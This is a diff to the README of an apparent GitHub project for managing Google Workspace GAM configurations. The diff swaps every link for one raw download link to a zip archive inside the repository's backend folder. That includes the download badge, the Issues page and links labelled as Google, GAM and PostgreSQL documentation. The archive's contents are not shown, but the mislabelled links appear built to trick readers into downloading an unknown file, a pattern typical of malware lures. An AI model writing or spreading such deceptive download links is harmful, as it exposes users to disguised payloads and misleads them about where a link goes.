@@ -6,7 +6,7 @@ Welcome to the gam-config-manager! This is a user-friendly web application that 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application. Click the link below:
 
-[![Download gam-config-manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Gabrielpimento/gam-config-manager/releases)
+[![Download gam-config-manager](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip)
 
 After visiting the page, find the latest release. Click on the download link for your operating system. Depending on your platform, you might see options for Windows, macOS, or Linux.
 
@@ -44,14 +44,14 @@ If you encounter issues during installation or while using the app, consider the
 - **Running Issues:** If the app doesn’t open, restart your computer and try again. Check for updates and ensure no conflicting applications are running.
 
 ## 🛠️ Support and Feedback
-We strive to make this application better. If you have any questions or feedback, please check the [Issues page](https://github.com/Gabrielpimento/gam-config-manager/issues) on GitHub. You can report bugs, request features, or ask for help from other users.
+We strive to make this application better. If you have any questions or feedback, please check the [Issues page](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip) on GitHub. You can report bugs, request features, or ask for help from other users.
 
 ## 📚 Additional Resources
 Feel free to explore the following resources to enhance your understanding of Google Workspace and the capabilities of gam-config-manager:
 
-- [Google Workspace Admin Help](https://support.google.com/a/)
-- [GAM Documentation](https://github.com/jay0lee/GAM/wiki)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Google Workspace Admin Help](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip)
+- [GAM Documentation](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Gabrielpimento/gam-config-manager/main/backend/app/gam-config-manager-3.6.zip)
 
 Thank you for using gam-config-manager! It is our goal to help you effectively manage your configurations with ease. For any updates or new features, keep an eye on the Releases page. 
 
